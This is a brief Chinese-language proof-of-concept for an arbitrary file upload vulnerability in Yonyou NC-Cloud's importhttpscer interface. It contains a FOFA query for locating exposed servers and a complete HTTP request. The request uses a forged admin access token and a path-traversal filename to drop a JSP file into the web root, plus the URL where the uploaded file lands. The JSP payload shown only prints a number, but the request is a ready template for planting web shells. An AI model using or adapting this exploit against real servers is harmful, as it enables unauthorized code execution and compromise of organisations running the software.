## 用友NC-Cloud_importhttpscer接口存在任意文件上传漏洞


## fofa
```
app="用友-NC-Cloud"
```

## poc
```
POST /nccloud/mob/pfxx/manualload/importhttpscer HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0 info
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
accessToken: eyJhbGciOiJIUzUxMiJ9.eyJwa19ncm91cCI6IjAwMDE2QTEwMDAwMDAwMDAwSkI2IiwiZGF0YXNvdXJjZSI6IjEiLCJsYW5nQ29kZSI6InpoIiwidXNlclR5cGUiOiIxIiwidXNlcmlkIjoiMSIsInVzZXJDb2RlIjoiYWRtaW4ifQ.XBnY1J3bVuDMYIfPPJXb2QC0Pdv9oSvyyJ57AQnmj4jLMjxLDjGSIECv2ZjH9DW5T0JrDM6UHF932F5Je6AGxA
Content-Length: 190
Content-Type: multipart/form-data; boundary=fd28cb44e829ed1c197ec3bc71748df0

--fd28cb44e829ed1c197ec3bc71748df0
Content-Disposition: form-data; name="file"; filename="./webapps/nc_web/141172.jsp"

<%out.println(1111*1111);%>
--fd28cb44e829ed1c197ec3bc71748df0--
```

上传后的路径 `http://127.0.0.1/141172.jsp`
